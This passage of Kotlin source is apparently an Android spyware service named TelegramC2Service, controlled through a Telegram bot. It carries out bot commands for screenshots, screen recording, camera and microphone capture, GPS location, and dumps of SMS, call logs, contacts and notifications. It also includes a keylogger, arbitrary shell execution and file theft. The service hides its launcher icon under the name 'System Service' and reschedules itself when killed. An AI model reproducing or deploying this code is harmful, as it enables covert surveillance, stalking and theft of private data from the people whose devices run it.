        val parts = data.split(":", limit = 3)
        val kind = parts.getOrNull(0) ?: return

        when (kind) {
            "menu" -> {
                val which = parts.getOrNull(1) ?: "main"
                answerCallback(callbackId)
                when (which) {
                    "close" -> {
                        val body = MultipartBody.Builder().setType(MultipartBody.FORM)
                            .addFormDataPart("chat_id", CHAT_ID)
                            .addFormDataPart("message_id", messageId.toString())
                            .build()
                        apiCall("deleteMessage", body)
                        return
                    }
                    "back" -> {
                        if (currentMenuPath.size > 1) currentMenuPath.removeAt(currentMenuPath.size - 1)
                        val prev = currentMenuPath.lastOrNull() ?: "main"
                        currentMenuMessageId = messageId
                        renderMenu(prev, messageId, edit = true)
                        return
                    }
                    "main" -> {
                        currentMenuPath = mutableListOf("main")
                        currentMenuMessageId = messageId
                        renderMenu("main", messageId, edit = true)
                        return
                    }
                    else -> {
                        val last = currentMenuPath.lastOrNull()
                        if (last != which) currentMenuPath.add(which)
                        currentMenuMessageId = messageId
                        renderMenu(which, messageId, edit = true)
                        return
                    }
                }
            }

            "act" -> {
                val action = parts.getOrNull(1) ?: return
                val sub = parts.getOrNull(2) ?: ""
                answerCallback(callbackId, "⏳")
                scope.launch { sendChatAction("typing") }
                runAction(action, sub)
            }

            "prompt" -> {
                val what = parts.getOrNull(1) ?: return
                answerCallback(callbackId, "send /$what <value>")
                sendMessage("Type: <code>/$what your_input</code>")
            }

            "fb" -> {
                val op = parts.getOrNull(1) ?: return
                val arg = parts.getOrNull(2) ?: ""
                when (op) {
                    "open" -> {
                        val real = pathOf(arg) ?: run {
                            answerCallback(callbackId, "path expired")
                            return
                        }
                        answerCallback(callbackId, "📂 opening…")
                        currentBrowsePath = real
                        currentBrowsePage = 0
                        currentMenuMessageId = messageId
                        renderFilesBrowser(messageId, edit = true)
                    }
                    "open_sd" -> {
                        answerCallback(callbackId, "📂 /sdcard")
                        currentBrowsePath = "/sdcard"
                        currentBrowsePage = 0
                        currentMenuMessageId = messageId
                        renderFilesBrowser(messageId, edit = true)
                    }
                    "page" -> {
                        answerCallback(callbackId)
                        currentBrowsePage = arg.toIntOrNull() ?: 0
                        currentMenuMessageId = messageId
                        renderFilesBrowser(messageId, edit = true)
                    }
                    "refresh" -> {
                        answerCallback(callbackId, "🔄")
                        currentMenuMessageId = messageId
                        renderFilesBrowser(messageId, edit = true)
                    }
                    "noop" -> answerCallback(callbackId)
                    "file" -> {
                        val real = pathOf(arg) ?: run {
                            answerCallback(callbackId, "path expired")
                            return
                        }
                        answerCallback(callbackId, "📤 sending…")
                        scope.launch { sendChatAction("upload_document") }
                        val f = File(real)
                        if (!f.exists() || !f.canRead()) {
                            sendMessage("⚠️ cannot read: <code>${f.name}</code>")
                            return
                        }
                        if (f.length() > 45L * 1024 * 1024) {
                            sendMessage("⚠️ file too large (>45 MB): <code>${f.name}</code>")
                            return
                        }
                        sendDocumentFile(f, "📄 <code>${f.name}</code>")
                    }
                }
            }
        }
    }

    private suspend fun runAction(action: String, sub: String) {
        log("runAction[$action]")
        try {
            when (action) {
                "no_projection" -> {
                    sendMessage("🚫 Screen capture not active.\n\nOpen the app → tap <b>4. Enable screen capture permission</b> → accept.")
                }

                "screenshot" -> {
                    val session = captureSession
                    if (session == null) { sendMessage("🚫 no projection session"); return }
                    val res = session.capture()
                    val b64 = res.optString("data_b64", "")
                    if (b64.isEmpty()) { sendMessage("⚠️ capture failed: ${res.optString("error")}"); return }
                    sendPhoto("screen_${System.currentTimeMillis()}.jpg",
                              Base64.decode(b64, Base64.NO_WRAP),
                              "📸 <i>${SimpleDateFormat("HH:mm:ss", Locale.US).format(Date())}</i>")
                }

                "screen_record" -> {
                    val proj = projection
                    if (proj == null) { sendMessage("🚫 no projection — enable capture first"); return }
                    val sec = sub.toIntOrNull()?.coerceIn(5, 120) ?: 30
                    sendMessage("🎥 recording ${sec}s…")
                    val res = ScreenRecorder.start(this, proj, sec)
                    if (res.has("error")) {
                        sendMessage("⚠️ ${res.optString("error")}")
                        return
                    }
                    delay((sec + 3) * 1000L)
                    val f = ScreenRecorder.currentFile()
                    if (f != null && f.exists()) {
                        sendDocumentFile(f, "🎥 screen recording (${sec}s)")
                    } else {
                        sendMessage("⚠️ recording failed to save")
                    }
                }

                "camera" -> {
                    val cam = sub.ifEmpty { "back" }
                    sendMessage("📷 taking $cam photo…")
                    val res = Camera.capture(this, cam)
                    val b64 = res.optString("data_b64", "")
                    if (b64.isEmpty()) { sendMessage("⚠️ camera error: ${res.optString("error")}"); return }
                    sendPhoto("cam_${System.currentTimeMillis()}.jpg",
                              Base64.decode(b64, Base64.NO_WRAP),
                              "📷 $cam camera")
                }

                "mic" -> {
                    val sec = sub.toIntOrNull()?.coerceIn(1, 60) ?: 10
                    sendMessage("🎙 recording ${sec}s…")
                    sendChatAction("record_voice")
                    val res = Audio.record(this, sec)
                    val b64 = res.optString("data_b64", "")
                    if (b64.isEmpty()) { sendMessage("⚠️ mic error: ${res.optString("error")}"); return }
                    sendAudio("mic_${System.currentTimeMillis()}.m4a", Base64.decode(b64, Base64.NO_WRAP))
                }

                "info" -> {
                    val s = DeviceInfo.snapshot(this, deviceId)
                    val bat = batteryPct()
                    val pretty = buildString {
                        append("<b>📱 Device Info</b>\n")
                        append("━━━━━━━━━━━━━━━━━━━━━\n")
                        append("🏷 Model: <b>${s.optString("model")}</b>\n")
                        append("🏭 Maker: ${s.optString("manufacturer")}\n")
                        append("🤖 Android: ${s.optString("android_version")} (SDK ${s.optInt("sdk_int")})\n")
                        append("💻 Host: <code>${s.optString("hostname")}</code>\n")
                        append("${batteryIcon(bat)} Battery: <b>$bat%</b>\n")
                        append("🆔 ID: <code>${s.optString("device_id")}</code>")
                    }
                    sendMessage(pretty)
                }

                "network" -> {
                    val n = NetworkInfo.snapshot(this)
                    val summary = buildString {
                        append("<b>🌐 Network</b>\n")
                        append("━━━━━━━━━━━━━━━━━━━━━\n")
                        if (n.optBoolean("has_wifi")) {
                            append("📶 WiFi: <b>${n.optString("wifi_ssid", "?")}</b>\n")
                            append("   IP: <code>${n.optString("wifi_ip", "?")}</code>\n")
                        }
                        if (n.optBoolean("has_cellular")) {
                            append("📡 Cellular: <b>${n.optString("sim_operator", "?")}</b>\n")
                        }
                        if (n.optBoolean("has_vpn")) append("🔐 VPN active\n")
                        append("\n<b>Interfaces:</b>\n")
                        val ifs = n.optJSONArray("interfaces")
                        if (ifs != null) {
                            for (i in 0 until ifs.length()) {
                                val o = ifs.getJSONObject(i)
                                append("• <code>${o.optString("interface")}</code>: ${o.optString("ip")}\n")
                            }
                        }
                    }
                    sendMessage(summary)
                }

                "location" -> {
                    sendChatAction("find_location")
                    val loc = Location.get(this)
                    if (loc.has("error")) {
                        sendMessage("📍 ${loc.optString("error")}\n<i>enable GPS or move near window</i>")
                    } else {
                        val lat = loc.optDouble("lat")
                        val lng = loc.optDouble("lng")
                        sendMessage(buildString {
                            append("<b>📍 Location</b>\n")
                            append("━━━━━━━━━━━━━━━━━━━━━\n")
                            append("Lat: <code>$lat</code>\n")
                            append("Lng: <code>$lng</code>\n")
                            append("Accuracy: ${loc.optDouble("accuracy")}m\n")
                            append("Provider: ${loc.optString("provider")}")
                        })
                        val body = MultipartBody.Builder().setType(MultipartBody.FORM)
                            .addFormDataPart("chat_id", CHAT_ID)
                            .addFormDataPart("latitude", lat.toString())
                            .addFormDataPart("longitude", lng.toString())
                            .build()
                        apiCall("sendLocation", body)
                    }
                }

                "apps" -> sendDocument("apps.json", "application/json",
                                        Apps.list(this, false).toString().toByteArray())
                "calls" -> sendDocument("calls.json", "application/json",
                                         CallLog.list(this, 50).toString().toByteArray())
                "sms" -> sendDocument("sms.json", "application/json",
                                       Sms.list(this, 50).toString().toByteArray())
                "contacts" -> sendDocument("contacts.json", "application/json",
                                            Contacts.list(this).toString().toByteArray())
                "notif" -> {
                    val res = JSONObject()
                        .put("count", NotificationsBuffer.peek().length())
                        .put("items", NotificationsBuffer.drain())
                    sendDocument("notifications.json", "application/json", res.toString().toByteArray())
                    refreshCurrentMenu()
                }
                "lock" -> {
                    val r = SystemControl.lockScreen(this)
                    if (r.has("error")) sendMessage("🔒 failed: ${r.optString("error")}\n<i>enable accessibility (step 5)</i>")
                    else sendMessage("🔒 device locked")
                }
                "home" -> {
                    val r = SystemControl.goHome()
                    if (r.has("error")) sendMessage("🏠 ${r.optString("error")}")
                    else sendMessage("🏠 done")
                }
                "back" -> {
                    val r = SystemControl.back()
                    if (r.has("error")) sendMessage("◀️ ${r.optString("error")}")
                    else sendMessage("◀️ done")
                }
                "recents" -> {
                    val r = SystemControl.recents()
                    if (r.has("error")) sendMessage("🪟 ${r.optString("error")}")
                    else sendMessage("🪟 done")
                }

                "hide_icon" -> {
                    val res = IconHider.hide(this)
                    if (res.has("error")) sendMessage("⚠️ ${res.optString("error")}")
                    else sendMessage("👻 icon hidden\n\n<i>Restore via:</i>\n<code>adb shell pm enable ${packageName}/.MainActivity</code>\n<i>or Settings → Apps → System Service</i>")
                }

                "show_icon" -> {
                    val res = IconHider.show(this)
                    if (res.has("error")) sendMessage("⚠️ ${res.optString("error")}")
                    else sendMessage("✅ icon restored")
                }

                "keylog_start" -> {
                    KeylogBuffer.start()
                    sendMessage("⌨️ keylogger <b>started</b>")
                    refreshCurrentMenu()
                }
                "keylog_stop" -> {
                    KeylogBuffer.stop()
                    sendMessage("⌨️ keylogger <b>stopped</b>")
                    refreshCurrentMenu()
                }
                "keylog_dump" -> {
                    val res = KeylogBuffer.dump()
                    val text = res.optString("output", "").ifEmpty { "(empty)" }
                    val lines = text.lines().takeLast(50).joinToString("\n")
                    sendMessage("<b>⌨️ Keylog dump</b>\n<pre>${lines.take(3500)}</pre>")
                    refreshCurrentMenu()
                }
                "keylog_info" -> sendMessage("keylog state: " +
                    (if (KeylogBuffer.isActive()) "🟢 recording" else "🔴 stopped"))

                "refresh" -> {
                    sendMessage("🔄 refreshing…")
                    delay(300)
                    refreshCurrentMenu()
                    sendMainMenu()
                }
                else -> sendMessage("unknown action: $action")
            }
        } catch (e: Exception) {
            lastError = e.message ?: "action_failed"
            log("runAction[$action] error: ${e.message}")
            sendMessage("⚠️ error: ${e.message}")
        }
    }

    private suspend fun dispatchTextCommand(text: String) {
        val parts = text.split(" ", limit = 2)
        val cmd = parts[0].lowercase().removePrefix("/")
        val arg = parts.getOrNull(1) ?: ""

        when (cmd) {
            "start", "menu", "help" -> sendMainMenu()
            "status" -> {
                val id = sendMessageWithKeyboard(statusMenuText(), statusMenuKeyboard())
                if (id > 0) {
                    currentMenuMessageId = id
                    currentMenuPath = mutableListOf("status")
                }
            }
            "files" -> {
                currentBrowsePath = "/sdcard"
                currentBrowsePage = 0
                currentMenuPath = mutableListOf("files")
                renderFilesBrowser(0, edit = false)
            }
            "shell" -> {
                if (arg.isEmpty()) { sendMessage("usage: <code>/shell ls -la</code>"); return }
                sendChatAction("typing")
                val res = Shell.exec(arg)
                val out = res.optString("stdout", "") + res.optString("stderr", "")
                sendMessage("<b>💻 shell</b> <code>[exit ${res.optInt("exit", -1)}]</code>\n<pre>${out.take(3500)}</pre>")
            }
            "screenshot" -> runAction("screenshot", "")
            "screen_record" -> runAction("screen_record", arg.ifEmpty { "30" })
            "camera" -> runAction("camera", arg.ifEmpty { "back" })
            "mic" -> runAction("mic", arg.ifEmpty { "10" })
            "location" -> runAction("location", "")
            "contacts" -> runAction("contacts", "")
            "sms" -> runAction("sms", arg)
            "calls" -> runAction("calls", arg)
            "apps" -> runAction("apps", "")
            "network" -> runAction("network", "")
            "notif" -> runAction("notif", "")
            "lock" -> runAction("lock", "")
            "home" -> runAction("home", "")
            "back" -> runAction("back", "")
            "recents" -> runAction("recents", "")
            "hide_icon" -> runAction("hide_icon", "")
            "show_icon" -> runAction("show_icon", "")
            "keylog_start" -> runAction("keylog_start", "")
            "keylog_stop" -> runAction("keylog_stop", "")
            "keylog_dump" -> runAction("keylog_dump", "")
            "get" -> {
                if (arg.isEmpty()) { sendMessage("usage: <code>/get /path/to/file</code>"); return }
                sendChatAction("upload_document")
                val f = File(arg)
                if (!f.exists() || !f.canRead()) {
                    sendMessage("⚠️ cannot read: <code>$arg</code>")
                    return
                }
                if (f.length() > 45L * 1024 * 1024) {
                    sendMessage("⚠️ file too large (>45 MB)")
                    return
                }
                sendDocumentFile(f, "📄 <code>${f.name}</code>")
            }
            "open" -> sendMessage(SystemControl.openApp(this, arg).toString())
            "url" -> sendMessage(SystemControl.openUrl(this, arg).toString())
            "info" -> runAction("info", "")
            else -> sendMessage("❓ unknown: /$cmd — try /start")
        }
    }

    override fun onTaskRemoved(rootIntent: Intent?) {
        log("onTaskRemoved — scheduling restart")
        try {
            val restart = Intent(applicationContext, TelegramC2Service::class.java)
            val flags = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M)
                PendingIntent.FLAG_UPDATE_CURRENT or PendingIntent.FLAG_IMMUTABLE
            else PendingIntent.FLAG_UPDATE_CURRENT
            val pi = PendingIntent.getService(applicationContext, 0xC3, restart, flags)
            val am = getSystemService(Context.ALARM_SERVICE) as android.app.AlarmManager
            am.set(
                android.app.AlarmManager.ELAPSED_REALTIME,
                SystemClock.elapsedRealtime() + 2000,
                pi
            )
        } catch (_: Exception) {}
        super.onTaskRemoved(rootIntent)
    }

    override fun onDestroy() {
        log("onDestroy — scheduling watchdog restart")
        captureSession?.release()
        captureSession = null
        try { projection?.stop() } catch (_: Exception) {}
        projection = null
        scope.cancel()

        try {
            val restart = Intent(applicationContext, TelegramC2Service::class.java)
            val flags = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M)
                PendingIntent.FLAG_UPDATE_CURRENT or PendingIntent.FLAG_IMMUTABLE
            else PendingIntent.FLAG_UPDATE_CURRENT
            val pi = PendingIntent.getService(applicationContext, 0xC3, restart, flags)
            val am = getSystemService(Context.ALARM_SERVICE) as android.app.AlarmManager
            am.set(
                android.app.AlarmManager.ELAPSED_REALTIME,
                SystemClock.elapsedRealtime() + 5000,
                pi
            )
        } catch (_: Exception) {}

        super.onDestroy()
    }
}
